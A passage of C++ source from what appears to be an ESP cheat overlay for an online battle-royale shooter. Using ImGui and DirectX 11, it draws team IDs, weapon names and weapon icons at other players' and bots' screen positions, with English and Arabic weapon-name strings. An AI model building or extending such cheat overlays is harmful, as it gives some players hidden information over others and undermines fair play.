													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 60, Screen.Y - 46, ImColor(Setting::BotTeamId[0], Setting::BotTeamId[1], Setting::BotTeamId[2], Setting::BotTeamId[3]), TemID.c_str(), BotTeamIdSize, false);

												}
											}
											else if (Setting::BotEspStyle == 2)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), BotTeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, ImColor(Setting::BotTeamId[0], Setting::BotTeamId[1], Setting::BotTeamId[2], Setting::BotTeamId[3]), TemID.c_str(), BotTeamIdSize, false);

												}
											}
											else if (Setting::BotEspStyle == 3)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), BotTeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, ImColor(Setting::BotTeamId[0], Setting::BotTeamId[1], Setting::BotTeamId[2], Setting::BotTeamId[3]), TemID.c_str(), BotTeamIdSize, false);

												}
											}
										}
										else if (bTeamIDStyle == 1)
										{
											if (Setting::BotEspStyle == 0)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), BotTeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, linescolors, TemID.c_str(), BotTeamIdSize, false);

												}
											}
											else if (Setting::BotEspStyle == 1)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), BotTeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, linescolors, TemID.c_str(), BotTeamIdSize, false);

												}
											}
											else if (Setting::BotEspStyle == 2)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), BotTeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, linescolors, TemID.c_str(), BotTeamIdSize, false);

												}
											}
											else if (Setting::BotEspStyle == 3)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), BotTeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, linescolors, TemID.c_str(), BotTeamIdSize, false);

												}
											}
										}
									}
									if (Setting::botweapon)
									{
										if (Setting::Lang == 0 || Setting::Lang == 2)
										{
											if (bWeaponStyle == 0)
											{
												if (Setting::BotEspStyle == 0 || Setting::BotEspStyle == 1 || Setting::BotEspStyle == 2 || Setting::BotEspStyle == 3)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "Fist")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, bweapsize, Text, Screen.X - 2, (Screen.Y + Screen.Z) + 20, ImColor(Setting::botweaponenemycolor[0], Setting::weaponenemycolor[1], Setting::botweaponenemycolor[2], Setting::botweaponenemycolor[3]), true);
														//DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::WeaponsFont, bweapsize, Text, Screen.X - 2, (Screen.Y + Screen.Z) + 20, ImColor(Setting::botweaponenemycolor[0], Setting::weaponenemycolor[1], Setting::botweaponenemycolor[2], Setting::botweaponenemycolor[3]), true);

													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, bweapsize, Text, Screen.X - 2, (Screen.Y + Screen.Z) + 20, ImColor(Setting::botweaponenemycolor[0], Setting::weaponenemycolor[1], Setting::botweaponenemycolor[2], Setting::botweaponenemycolor[3]), true);
													}
												}
											}
											else if (bWeaponStyle == 1)
											{
												if (Setting::BotEspStyle == 0 || Setting::BotEspStyle == 1 || Setting::BotEspStyle == 2 || Setting::BotEspStyle == 3)
												{
													string wep = AActor.Weapon;
													if (wep == "Fist")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand22, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "AKM")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand24, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "ACE32")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand39, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "AUG")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand28, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "M24")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand7, Screen.X - 35, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "Kar98k")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand1, Screen.X - 35, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "AWM")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand23, Screen.X - 35, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "Mosin")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand55, Screen.X - 35, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == "M762")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand15, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "FAMAS")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand57, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "M416")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand2, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Honey Badger")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand42, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "P18C" || wep == "Vz61" || wep == "R1895")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand32, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "Flaregun")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand46, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "P1911")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand48, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "R45")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand45, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "P92")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand50, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "DesertEagle")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand44, Screen.X, Screen.Y - 55, 30, 20);
														continue;
													}
													else if (wep == "QBU")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand26, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "SLR")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand14, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "SKS")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand13, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "Mini14")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand27, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "Mk14")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand4, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "VSS")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand17, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "Win94")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand33, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "MK12")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand49, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "SCAR-L")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand6, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "M16A4")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand3, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Mk47")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand10, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "G36")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand29, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "QBZ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand8, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Groza")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand5, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "DP28")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand9, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "M249")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand25, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "MG3")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand43, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "P90")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand54, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "UMP9")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand18, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "PP19")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand30, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Uzi")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand31, Screen.X - 35, Screen.Y - 55, 35, 20);
														continue;
													}
													else if (wep == "TommyGun")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand34, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Vector")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "MP5K")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand51, Screen.X - 35, Screen.Y - 55, 50, 20);
														continue;
													}
													else if (wep == "SawedOff")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand36, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "S1897")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand12, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "S686")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand16, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "M1014")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand56, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "S12K")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand11, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "DP12")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand38, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Shoulei Grenade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand19, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Smoke Grenade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand20, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "Burn Grenade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand21, Screen.X - 35, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == "CrossBow")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand37, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == "AMR")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 35, Screen.Y - 55, 80, 20);
														continue;
													}
												}
											}
										}
										else if (Setting::Lang == 1)
										{
											if (bWeaponStyle == 0)
											{
												if (Setting::EspStyle == 0)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "ﺪﻴﻟﺍ")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, (Screen.Y + Screen.Z) + 20, ImColor(Setting::botweaponenemycolor[0], Setting::weaponenemycolor[1], Setting::botweaponenemycolor[2], Setting::botweaponenemycolor[3]), true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, (Screen.Y + Screen.Z) + 20, ImColor(Setting::botweaponenemycolor[0], Setting::weaponenemycolor[1], Setting::botweaponenemycolor[2], Setting::botweaponenemycolor[3]), true);
													}
												}
												else if (Setting::EspStyle == 1)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "ﺪﻴﻟﺍ")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, (Screen.Y + Screen.Z) + 20, ImColor(Setting::botweaponenemycolor[0], Setting::weaponenemycolor[1], Setting::botweaponenemycolor[2], Setting::botweaponenemycolor[3]), true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, (Screen.Y + Screen.Z) + 20, ImColor(Setting::botweaponenemycolor[0], Setting::weaponenemycolor[1], Setting::botweaponenemycolor[2], Setting::botweaponenemycolor[3]), true);
													}
												}
												else if (Setting::EspStyle == 2)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "ﺪﻴﻟﺍ")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, (Screen.Y + Screen.Z) + 20, ImColor(Setting::botweaponenemycolor[0], Setting::weaponenemycolor[1], Setting::botweaponenemycolor[2], Setting::botweaponenemycolor[3]), true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, (Screen.Y + Screen.Z) + 20, ImColor(Setting::botweaponenemycolor[0], Setting::weaponenemycolor[1], Setting::botweaponenemycolor[2], Setting::botweaponenemycolor[3]), true);
													}
												}
												else if (Setting::EspStyle == 3)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "ﺪﻴﻟﺍ")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, (Screen.Y + Screen.Z) + 20, ImColor(Setting::botweaponenemycolor[0], Setting::weaponenemycolor[1], Setting::botweaponenemycolor[2], Setting::botweaponenemycolor[3]), true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X + 2, (Screen.Y + Screen.Z) + 20, ImColor(Setting::botweaponenemycolor[0], Setting::weaponenemycolor[1], Setting::botweaponenemycolor[2], Setting::botweaponenemycolor[3]), true);
													}
												}
											}
											else if (bWeaponStyle == 1)
											{
												if (Setting::EspStyle == 0)
												{
													string wep = AActor.Weapon;
													if (wep == u8"ﺪﻴﻟﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand22, Screen.X - 30, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻡﺍ ﻲﻛ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand24, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"23 ﺲﻳﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand39, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺟ ﻮﻳ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand28, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺳ ﻲﻛ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand7, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == u8"ﻲﻛ 89 ﺭﺎﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand1, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == u8"ﻡﻭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand23, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == u8"ﻦﻴﺳﻮﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand55, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == u8"ﻦﻔﺳ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand15, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﺱﺎﻣﺎﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand57, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﺭﻮﻓ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand2, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﺮﺟﺪﺑ ﻲﻧﺎﻫ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand42, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺳ 81 ﻲﺑ" || wep == u8"16 ﺩﺯ ﻲﻓ" || wep == u8"5981 ﺭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand32, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"ﻦﺟ ﺮﻴﻠﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand46, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"1191 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand48, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"54 ﺭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand45, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"29 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand50, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"ﻞﺠﻳﺍ ﺕﺮﻳﺰﻳﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand44, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"ﻮﻳ ﻲﺑ ﻮﻴﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand26, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == u8"ﺭﺍ ﻝﺍ ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand14, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == u8"ﺱﺍ ﻲﻛ ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand13, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == u8"41 ﻲﻨﻴﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand27, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == u8"41 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand4, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == u8"ﺱﺍ ﺱﺍ ﻲﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand17, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == u8"49 ﻦﻳﻭ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand33, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == u8"21 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand49, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == u8"ﻝﺍ ﺭﺎﻜﺳﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand6, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"M16A4")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand3, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"74 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand10, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺳ 63 ﻲﺟ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand29, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﺩﺯ ﻲﺑ ﻮﻴﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand8, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﺍﺯﻭﺮﺟ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand5, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"82 ﻲﺑ ﻱﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand9, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺳ ﻲﻛ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand25, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"3 ﻲﺟ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand43, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"09 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand54, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺑ ﻡﺍ ﻮﻳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand18, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"91 ﻲﺑ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand30, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻱﺯﻭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand31, Screen.X - 35, Screen.Y - 35, 35, 20);
														continue;
													}
													else if (wep == u8"ﻦﺟ ﻲﻣﻮﺗ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand34, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﺭﻮﺘﻜﻴﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﻛ 5 ﻲﺑ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand51, Screen.X - 35, Screen.Y - 35, 50, 20);
														continue;
													}
													else if (wep == u8"ﻑﻭﺍ ﺩﺍﻮﺳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand36, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"7981 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand12, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"686 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand16, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"4101 ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand56, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﻛ 21 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand11, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"21 ﻲﺑ ﻱﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand38, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﺔﻠﺒﻨﻗ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand19, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻙﻮﻤﺳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand20, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻑﻮﺗﻮﻟﻮﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand21, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"CrossBow")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand37, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == u8"ﺭﺍ ﻡﺍ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == u8"Dagger")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand58, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"Zombie Blade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand59, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == u8"Zombie Hammer")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand60, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
												}
												else if (Setting::EspStyle == 1 || Setting::EspStyle == 2 || Setting::EspStyle == 3)
												{
													string wep = AActor.Weapon;
													if (wep == u8"ﺪﻴﻟﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand22, Screen.X - 30, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == u8"ﻡﺍ ﻲﻛ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand24, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"23 ﺲﻳﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand39, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺟ ﻮﻳ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand28, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺳ ﻲﻛ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand7, Screen.X - 30, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == u8"ﻲﻛ 89 ﺭﺎﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand1, Screen.X - 30, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == u8"ﻡﻭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand23, Screen.X - 30, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == u8"ﻦﻴﺳﻮﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand55, Screen.X - 30, Screen.Y - 55, 80, 15);
														continue;
													}
													else if (wep == u8"ﻦﻔﺳ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand15, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﺱﺎﻣﺎﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand57, Screen.X - 30, Screen.Y - 55, 60, 20);
